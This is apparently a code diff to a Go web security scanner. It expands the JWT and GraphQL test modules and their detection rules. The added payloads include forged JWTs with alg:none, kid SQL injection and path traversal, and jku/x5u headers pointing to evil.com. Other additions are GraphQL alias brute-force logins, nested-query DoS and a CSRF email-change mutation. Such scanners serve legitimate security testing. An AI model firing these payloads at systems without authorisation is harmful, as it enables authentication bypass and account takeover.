@@ -60,15 +60,25 @@ func (m *JWTModule) Description() string { return "JWT Algorithm Confusion / For
 func (m *JWTModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
 	var payloads []mutator.Payload
 	raw := []struct{ v, t string }{
-		// alg:none
+		// alg:none variants
 		{`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "alg-none"},
 		{`eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "alg-None"},
 		{`eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "alg-NONE"},
-		{`eyJhbGciOiJub25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "alg-nonE"},
+		{`eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "alg-nOnE"},
 		// Empty signature
 		{`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "empty-sig"},
-		// jwk header injection
-		{`eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMCIsImUiOiIwIn19.eyJhZG1pbiI6dHJ1ZX0.`, "jwk-inject"},
+		// kid path traversal (header: {"kid":"/dev/null","alg":"HS256"}, signed with empty secret)
+		{`eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "kid-path-traversal"},
+		// kid SQLi (header: {"kid":"x' UNION SELECT 'secret'--","alg":"HS256"})
+		{`eyJraWQiOiJ4JyBVTklPTiBTRUxFQ1QgJ3NlY3JldCctLSIsImFsZyI6IkhTMjU2In0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "kid-sqli"},
+		// jku header injection ({"jku":"http://evil.com/.well-known/jwks.json","alg":"RS256"})
+		{`eyJqa3UiOiJodHRwOi8vZXZpbC5jb20vLndlbGwta25vd24vandrcy5qc29uIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "jku-inject"},
+		// x5u header injection ({"x5u":"http://evil.com/cert.pem","alg":"RS256"})
+		{`eyJ4NXUiOiJodHRwOi8vZXZpbC5jb20vY2VydC5wZW0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "x5u-inject"},
+		// Embedded JWK in header ({"jwk":{"kty":"oct","k":""},"alg":"HS256"})
+		{`eyJqd2siOnsia3R5Ijoib2N0IiwiayI6IiJ9LCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.`, "embedded-jwk"},
+		// jwk RSA injection
+		{`eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMCIsImUiOiIwIn19.eyJhZG1pbiI6dHJ1ZX0.`, "jwk-rsa-inject"},
 	}
 	for _, point := range points {
 		if looksLikeToken(point.Name, point.OriginalValue) {
@@ -82,11 +92,18 @@ func (m *JWTModule) GeneratePayloads(points []input.InjectionPoint, mode string,
 
 func (m *JWTModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
 	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
-	// Se aceita token sem assinatura (200 ao invés de 401)
+	// Critical: manipulated JWT returns 200 when baseline was 401 (auth bypass)
+	if respStatus == 200 && baseStatus == 401 {
+		return &Finding{Module: "jwt", Severity: "critical", Confidence: "confirmed",
+			Title: "JWT - Auth bypass via " + payload.Variant, Payload: payload.Value, Point: payload.Point,
+			Evidence: fmt.Sprintf("Manipulated JWT (%s) returned 200 vs baseline 401", payload.Variant),
+			OWASP: "A07:2021 Identification and Authentication Failures", CWE: "CWE-345"}
+	}
+	// Also flag if accepted with 200 on a 200 baseline (token replaced but still works)
 	if respStatus == 200 && (baseStatus == 200 || baseStatus == 302) {
 		return &Finding{Module: "jwt", Severity: "critical", Confidence: "high",
 			Title: "JWT - Algorithm confusion/none accepted", Payload: payload.Value, Point: payload.Point,
-			Evidence: fmt.Sprintf("Token com %s aceito (status=%d)", payload.Variant, respStatus),
+			Evidence: fmt.Sprintf("Token with %s accepted (status=%d)", payload.Variant, respStatus),
 			OWASP: "A07:2021 Identification and Authentication Failures", CWE: "CWE-345"}
 	}
 	return nil
@@ -306,13 +323,21 @@ func (m *GraphQLModule) Description() string { return "GraphQL Introspection / I
 func (m *GraphQLModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
 	var payloads []mutator.Payload
 	raw := []struct{ v, t string }{
-		{`{"query":"{ __schema { types { name } } }"}`, "introspection"},
+		{`{"query":"{ __schema { types { name fields { name } } } }"}`, "introspection"},
 		{`{"query":"{ __schema { queryType { name } mutationType { name } } }"}`, "introspection-full"},
 		{`{"query":"{__typename}"}`, "typename"},
 		{`{"query":"query { user(id: \"1 OR 1=1\") { id name } }"}`, "sqli-in-arg"},
 		{`[{"query":"{ user(id:1) { id } }"},{"query":"{ user(id:2) { id } }"}]`, "batching"},
 		{`{"query":"query { a: user(id:1) { id } b: user(id:2) { id } c: user(id:3) { id } }"}`, "alias-enum"},
 		{`{"query":"{ ` + strings.Repeat("a { ", 50) + `id` + strings.Repeat(" }", 50) + ` }"}`, "dos-nesting"},
+		// Alias-based batching (5 aliases for auth brute-force)
+		{`{"query":"{ a1:login(user:\"a\",pass:\"1\"){token} a2:login(user:\"b\",pass:\"2\"){token} a3:login(user:\"c\",pass:\"3\"){token} a4:login(user:\"d\",pass:\"4\"){token} a5:login(user:\"e\",pass:\"5\"){token} }"}`, "alias-batch-auth"},
+		// Field suggestion leak (invalid field triggers suggestion)
+		{`{"query":"{ user { zzz_nonexistent_field } }"}`, "field-suggestion"},
+		// Nested query DoS (10 levels)
+		{`{"query":"{ f1 { f2 { f3 { f4 { f5 { f6 { f7 { f8 { f9 { f10 { id } } } } } } } } } } }"}`, "nested-dos-10"},
+		// CSRF via GET (mutation as query param)
+		{`query=mutation{changeEmail(email:"evil@attacker.com"){status}}`, "csrf-get-mutation"},
 	}
 	for _, point := range points {
 		for _, p := range raw {
@@ -324,17 +349,45 @@ func (m *GraphQLModule) GeneratePayloads(points []input.InjectionPoint, mode str
 
 func (m *GraphQLModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
 	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {
-	if strings.Contains(respBody, "__schema") || strings.Contains(respBody, "__type") {
+	// Introspection enabled
+	if (strings.Contains(payload.Variant, "introspection") || payload.Variant == "typename") &&
+		(strings.Contains(respBody, "__schema") || strings.Contains(respBody, "__type") || strings.Contains(respBody, "queryType")) {
 		return &Finding{Module: "graphql", Severity: "medium", Confidence: "confirmed",
 			Title: "GraphQL - Introspection enabled", Payload: payload.Value, Point: payload.Point,
-			Evidence: "Schema exposto via introspection query",
+			Evidence: "Schema exposed via introspection query",
 			OWASP: "API9:2023 Improper Inventory Management", CWE: "CWE-200"}
 	}
-	if strings.Contains(payload.Variant, "batching") && respStatus == 200 && strings.Contains(respBody, "data") {
-		return &Finding{Module: "graphql", Severity: "medium", Confidence: "high",
-			Title: "GraphQL - Batching enabled (rate limit bypass)", Payload: payload.Value, Point: payload.Point,
-			Evidence: "Batch query aceita",
+	// Field suggestion leak
+	if payload.Variant == "field-suggestion" && respStatus == 200 {
+		if strings.Contains(respBody, "Did you mean") || strings.Contains(respBody, "suggestion") {
+			return &Finding{Module: "graphql", Severity: "low", Confidence: "confirmed",
+				Title: "GraphQL - Field suggestion leak", Payload: payload.Value, Point: payload.Point,
+				Evidence: "Server suggests valid field names in error response",
+				OWASP: "API9:2023 Improper Inventory Management", CWE: "CWE-200"}
+		}
+	}
+	// Batching enabled (rate limit bypass / auth brute-force)
+	if (strings.Contains(payload.Variant, "batching") || payload.Variant == "alias-batch-auth") &&
+		respStatus == 200 && strings.Contains(respBody, "data") {
+		sev := "medium"
+		title := "GraphQL - Batching enabled (rate limit bypass)"
+		if payload.Variant == "alias-batch-auth" && strings.Contains(respBody, "token") {
+			sev = "high"
+			title = "GraphQL - Alias batching auth bypass"
+		}
+		return &Finding{Module: "graphql", Severity: sev, Confidence: "high",
+			Title: title, Payload: payload.Value, Point: payload.Point,
+			Evidence: "Batch/alias query accepted",
 			OWASP: "API4:2023 Unrestricted Resource Consumption", CWE: "CWE-770"}
+	}
+	// Nested DoS
+	if strings.Contains(payload.Variant, "nested") || strings.Contains(payload.Variant, "dos") {
+		if respTime > baseTime*3 && respTime > 3000 {
+			return &Finding{Module: "graphql", Severity: "medium", Confidence: "high",
+				Title: "GraphQL - Nested query DoS", Payload: payload.Value, Point: payload.Point,
+				Evidence: fmt.Sprintf("Nested query caused %dms response (baseline %dms)", respTime, baseTime),
+				OWASP: "API4:2023 Unrestricted Resource Consumption", CWE: "CWE-400"}
+		}
 	}
 	return nil
 }
